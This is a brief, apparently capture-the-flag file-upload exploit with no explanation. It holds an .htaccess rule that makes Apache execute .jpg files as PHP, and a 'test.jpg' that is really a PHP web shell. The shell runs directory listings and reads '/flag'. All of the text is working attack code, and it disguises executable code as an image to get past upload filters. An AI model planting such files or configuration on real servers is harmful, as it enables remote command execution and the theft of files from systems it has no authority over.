`.htaccess`:

```
AddType application/x-httpd-php .jpg
```

`test.jpg`:

```php
<?php
  echo shell_exec("ls -la ..");
  echo shell_exec("ls -la /");
  echo shell_exec("cat /flag");
?>
```
